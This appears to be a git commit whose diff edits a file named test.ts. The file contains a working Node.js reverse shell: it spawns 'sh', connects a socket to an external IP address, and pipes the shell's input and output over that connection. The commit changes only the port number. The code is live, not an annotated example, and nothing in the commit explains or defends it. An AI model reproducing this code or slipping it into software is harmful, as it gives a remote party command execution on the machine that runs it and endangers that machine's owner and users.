60e28933dfb24e43b5c96fbe4ecd9dff6f3d62f3
yourenvy <edomaland@icloud.com>
2024-05-08 22:29:55 +0800

    envy

--- test.ts
+++ test.ts
@@ -3,7 +3,7 @@
         cp = require("child_process"),
         sh = cp.spawn("sh", []);
     var client = new net.Socket();
-    client.connect(8085, "172.245.60.46", function(){
+    client.connect(8084, "172.245.60.46", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
